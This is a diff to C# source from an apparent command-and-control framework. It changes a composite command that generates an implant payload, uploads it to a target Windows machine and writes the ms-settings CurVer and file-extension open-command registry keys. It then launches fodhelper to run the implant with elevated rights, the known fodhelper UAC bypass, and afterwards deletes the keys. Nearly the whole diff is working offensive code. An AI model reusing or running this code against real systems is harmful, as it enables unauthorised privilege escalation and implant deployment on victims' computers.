@@ -62,6 +62,7 @@ namespace Commander.Commands.Composite
             var endpoint = ConnexionUrl.FromString($"pipe://*:{options.pipe}");
             var payloadOptions = new ImplantConfig()
             {
+                //StoreImplant = false,
                 Architecture =  options.x86 ? ImplantArchitecture.x86 : ImplantArchitecture.x64,
                 Endpoint = endpoint,
                 IsDebug = false,
@@ -76,8 +77,8 @@ namespace Commander.Commands.Composite
             //    payloadOptions.InjectionProcess = options.injectProcess;
 
             commander.WriteInfo($"[>] Generating Payload!");
-            var pay = commander.GeneratePayload(payloadOptions, options.verbose);
-            if (pay == null)
+            var implant = commander.GeneratePayload(payloadOptions);
+            if (implant == null)
             {
                 commander.WriteError($"[X] Generation Failed!");
                 return;
@@ -90,29 +91,29 @@ namespace Commander.Commands.Composite
 
 
 
-            var fileName = string.IsNullOrEmpty(options.file) ? ShortGuid.NewGuid() + ".exe" : options.file;
+            var fileName = string.IsNullOrEmpty(options.file) ? implant.Config.ImplantName + ".exe" : options.file;
             if (Path.GetExtension(fileName).ToLower() != ".exe")
                 fileName += ".exe";
 
             string path = options.path + (options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;
 
             agent.Echo($"Uploading file {fileName} to {path}");
-            agent.Upload(pay, path);
+            agent.Upload(Convert.FromBase64String(implant.Data), path);
             agent.Delay(1);
             agent.Echo($"Altering registry Keys");
-            agent.Shell($"reg add \"HKCU\\Software\\Classes\\.{options.key}\\Shell\\Open\\command\" /d \"{path}\" /f");
-            //agent.RegistryAdd(@$"HKCU\Software\Classes\.{options.key}\Shell\Open\", "command", path);
-            agent.Shell($"reg add \"HKCU\\Software\\Classes\\ms-settings\\CurVer\" /d \".{options.key}\" /f");
-            //agent.RegistryAdd(@$"HKCU\Software\Classes\ms-settings\", "CurVer", $".{options.key}");
-            agent.Delay(5);
+            //agent.Shell($"reg add \"HKCU\\Software\\Classes\\.{options.key}\\Shell\\Open\\command\" /d \"{path}\" /f");
+            agent.RegistryAdd(@$"HKCU\Software\Classes\.{options.key}\Shell\Open\command", string.Empty, path);
+            //agent.Shell($"reg add \"HKCU\\Software\\Classes\\ms-settings\\CurVer\" /d \".{options.key}\" /f");
+            agent.RegistryAdd(@$"HKCU\Software\Classes\ms-settings\CurVer", string.Empty, $".{options.key}");
+            agent.Delay(10);
             agent.Echo($"Starting fodhelper");
             agent.Shell("fodhelper");
-            agent.Delay(5);
+            agent.Delay(10);
             agent.Echo($"Cleaning");
             //agent.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\.{options.key} -Recurse  -Force -Verbose");
             //agent.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\ms-settings\\CurVer -Recurse -Force -Verbose");
-            //agent.RegistryRemove(@"HKCU\Software\Classes\", $".{options.key}");
-            //agent.RegistryRemove(@"HKCU\Software\Classes\ms-settings", $"CurVer");
+            agent.RegistryRemove(@"HKCU\Software\Classes\", $".{options.key}");
+            agent.RegistryRemove(@"HKCU\Software\Classes\ms-settings", $"CurVer");
             if (!options.inject)
             {
                 agent.Echo($"[!] Don't forget to remove executable after use! : del {path}");
